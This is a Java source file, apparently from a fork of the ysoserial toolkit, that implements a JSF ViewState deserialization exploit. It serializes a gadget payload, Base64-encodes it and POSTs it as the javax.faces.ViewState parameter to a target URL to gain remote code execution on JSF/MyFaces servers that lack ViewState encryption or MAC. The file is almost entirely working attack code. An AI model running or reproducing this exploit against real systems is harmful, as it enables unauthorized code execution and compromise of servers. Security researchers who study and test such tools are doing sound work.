package com.h2tg.ysogate.server;


import org.apache.commons.codec.binary.Base64;
import com.h2tg.ysogate.Main;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;


/**
 * JSF view state exploit
 * <p>
 * Delivers a gadget payload via JSF ViewState token.
 * <p>
 * This will only work if ViewState encryption/mac is disabled.
 * <p>
 * While it has been long known that client side state saving
 * with encryption disabled leads to RCE via EL injection,
 * this of course also works with deserialization gadgets.
 * <p>
 * Also, it turns out that MyFaces is vulnerable to this even when
 * using server-side state saving
 * (yes, please, let's (de-)serialize a String as an Object).
 *
 * @author mbechler
 */
public class JSF {

	public static void main(String[] args) {

		if (args.length < 3) {
			System.err.println(JSF.class.getName() + " <view_url> <args...>");
			System.exit(-1);
		}

		try {
			URL u = new URL(args[0]);

			// 去除前两个参数
			String[] newArray = new String[args.length - 1];
			System.arraycopy(args, 1, newArray, 0, newArray.length);

			Main.main(newArray);
			Object payloadObject = Main.PAYLOAD;

			URLConnection c = u.openConnection();
			if (!(c instanceof HttpURLConnection)) {
				throw new IllegalArgumentException("Not a HTTP url");
			}

			HttpURLConnection hc = (HttpURLConnection) c;
			hc.setDoOutput(true);
			hc.setRequestMethod("POST");
			hc.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
			OutputStream os = hc.getOutputStream();

			ByteArrayOutputStream bos = new ByteArrayOutputStream();
			ObjectOutputStream    oos = new ObjectOutputStream(bos);
			oos.writeObject(payloadObject);
			oos.close();
			byte[] data        = bos.toByteArray();
			String requestBody = "javax.faces.ViewState=" + URLEncoder.encode(Base64.encodeBase64String(data), "US-ASCII");
			os.write(requestBody.getBytes("US-ASCII"));
			os.close();

			System.err.println("Have response code " + hc.getResponseCode() + " " + hc.getResponseMessage());
		} catch (Exception e) {
			e.printStackTrace(System.err);
		}
	}


}
